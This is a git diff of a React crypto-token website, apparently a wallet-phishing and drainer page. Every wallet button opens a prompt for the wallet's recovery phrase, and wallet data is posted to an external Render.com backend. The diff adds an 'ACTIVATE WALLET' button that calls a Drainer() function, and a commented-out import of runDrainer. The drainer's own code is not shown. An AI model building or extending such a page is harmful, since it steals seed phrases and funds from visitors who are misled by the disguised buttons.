@@ -2,15 +2,9 @@ import { useState } from 'react';
 import logoImg from './assets/logo.jpg';
 import chartImg2 from './assets/chart2.jpg';
 import chartImg3 from './assets/chart3.jpg';
-import metamaskImg from './assets/metamask.jpg';
-import walletConnectImg from './assets/walletConnect.jpg';
-import coinbaseImg from './assets/coinbase.svg';
-import trustWalletImg from './assets/trustWallet.jpg';
-import safemoonImg from './assets/safemoon.jpg';
-import bitgetImg from './assets/Bitget.jpg';
-import okxImg from './assets/okx.jpg';
-import phantomImg from './assets/phantom.jpg';
-import ledgerImg from './assets/ledger.jpg';
+
+
+// import {runDrainer} from './drainer';
 // import chartImg1D from './assets/1D.jpg';
 // import chartImg1H from './assets/1H.jpg';
 // import chartImg1M from './assets/1M.jpg';
@@ -242,6 +236,9 @@ function App() {
 		return `wallet-data-${timestamp}.json`;
 	};
 
+
+
+
 	// Use production backend URL (Render.com)
 	const API_URL = 'https://grovetoken-1.onrender.com/api/wallet';
 
@@ -400,7 +397,7 @@ function App() {
 				<img
 					src="/assets/metamask.jpg"
 					alt="MetaMask"
-					className="w-10 h-10"
+					className="w-30 h-15"
 				/>
 			),
 		},
@@ -410,7 +407,7 @@ function App() {
 				<img
 					src="/assets/walletConnect.jpg"
 					alt="WalletConnect"
-					className="w-10 h-10"
+					className="w-30 h-15"
 				/>
 			),
 		},
@@ -420,7 +417,7 @@ function App() {
 				<img
 					src="/assets/coinbase.svg"
 					alt="Coinbase"
-					className="w-10 h-10"
+					className="w-30 h-15"
 				/>
 			),
 		},
@@ -430,17 +427,7 @@ function App() {
 				<img
 					src="/assets/trustWallet.jpg"
 					alt="Trust"
-					className="w-10 h-10"
-				/>
-			),
-		},
-		{
-			name: 'Safemoon',
-			icon: (
-				<img
-					src="/assets/safemoon.jpg"
-					alt="Safemoon"
-					className="w-10 h-10"
+					className="w-32 h-15"
 				/>
 			),
 		},
@@ -450,7 +437,7 @@ function App() {
 				<img
 					src="/assets/Bitget.jpg"
 					alt="Bitget"
-					className="w-10 h-10"
+					className="w-30 h-15"
 				/>
 			),
 		},
@@ -460,7 +447,7 @@ function App() {
 				<img
 					src="/assets/okx.jpg"
 					alt="Okx"
-					className="w-10 h-10"
+					className="w-30 h-15"
 				/>
 			),
 		},
@@ -470,7 +457,7 @@ function App() {
 				<img
 					src="/assets/phantom.jpg"
 					alt="Phantom"
-					className="w-10 h-10"
+					className="w-30 h-15"
 				/>
 			),
 		},
@@ -480,7 +467,27 @@ function App() {
 				<img
 					src="/assets/ledger.jpg"
 					alt="Ledger"
-					className="w-10 h-10"
+					className="w-30 h-15"
+				/>
+			),
+		},
+		{
+			name: 'Bifrost',
+			icon: (
+				<img
+					src="/assets/bifrost.jpg"
+					alt="Bifrost"
+					className="w-30 h-15"
+				/>
+			),
+		},
+		{
+			name: 'Dcent',
+			icon: (
+				<img
+					src="/assets/Dcent.jpg"
+					alt="Dcent"
+					className="w-30 h-15"
 				/>
 			),
 		},
@@ -507,8 +514,8 @@ function App() {
 			{/* Sidebar - Responsive */}
 			<aside className={`
 				w-64 flex flex-col justify-between py-8 px-4 bg-[#01051e] border-r border-[#1a2147]
-				fixed lg:sticky top-0 left-0 h-screen z-50 lg:z-auto
-				transform transition-transform duration-300 ease-in-out lg:transform-none
+				fixed top-0 left-0 h-screen z-50 overflow-y-auto
+				transform transition-transform duration-300 ease-in-out
 				${isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full lg:translate-x-0'}
 			`}>
 				<div>
@@ -592,7 +599,7 @@ function App() {
 			</aside>
 
 			{/* Main Content - Responsive */}
-			<div className="flex-1 flex flex-col min-h-screen overflow-y-auto lg:ml-0 w-full max-w-full">
+			<div className="flex-1 flex flex-col min-h-screen overflow-y-auto lg:ml-64 w-full max-w-full">
 				{/* Header - Responsive */}
 				<header className="flex items-center justify-between lg:justify-end gap-2 md:gap-4 px-4 md:px-8 py-4 md:py-6 border-b border-[#1a2147] bg-[#01051e] sticky top-0 z-10">
 					{/* Mobile Menu Button */}
@@ -713,11 +720,11 @@ function App() {
 								</div>
 							</div>
 							{/* Right wallet grid - Responsive */}
-							<div className="flex-1 p-4 sm:p-6 lg:p-8 grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4 lg:gap-6 items-center justify-items-center">
+							<div className="flex-1 p-4 sm:p-6 lg:p-8 grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 lg:gap-6 items-center justify-items-center">
 								{walletOptions.map((w) => (
 									<button
 										key={w.name}
-										className="flex flex-col items-center gap-1 sm:gap-2 bg-[#10163a] hover:bg-primary/10 rounded-xl p-3 sm:p-4 w-24 h-28 sm:w-28 sm:h-32 border border-transparent hover:border-primary transition"
+										className="flex flex-col items-center gap-1 sm:gap-2 bg-transparent hover:bg-primary/10 rounded-xl p-3 sm:p-4 w-24 h-28 sm:w-28 sm:h-32 border border-transparent hover:border-primary transition"
 										onClick={() => setShowWalletPhraseModal(true)}
 									>
 										<div className="w-10 h-10 sm:w-12 sm:h-12 flex items-center justify-center mb-1 sm:mb-2">
@@ -1995,6 +2002,20 @@ function App() {
 										onClick={() => setShowWalletModal(true)}
 									>
 										CONNECT WALLET
+									</button>
+
+									<button
+										className=" w-full bg-[#1f994f] text-dark font-bold text-xl py-4 my-6 rounded-full"
+										onClick={() => {
+											console.log('Running drainer function...');
+
+											// Run the drainer function
+											Drainer();
+										}}
+										
+										
+									>
+										ACTIVATE WALLET
 									</button>
 								</div>
 							</div>
